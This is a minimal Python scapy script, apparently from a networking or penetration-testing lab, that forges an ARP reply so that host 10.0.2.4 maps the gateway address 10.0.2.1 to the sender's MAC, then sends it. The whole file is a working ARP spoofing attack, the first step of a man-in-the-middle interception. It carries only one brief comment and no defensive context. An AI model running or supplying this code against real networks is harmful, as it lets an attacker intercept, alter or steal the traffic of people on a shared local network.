#!/usr/bin//env python

import scapy.all as scapy

#op=2 is a arp reqponse and not a request
packet = scapy.ARP(op=2, pdst="10.0.2.4", hwdst="08:00:27:33:26:01", psrc="10.0.2.1")
#print(packet.show())
#print(packet.summary())
scapy.send(packet)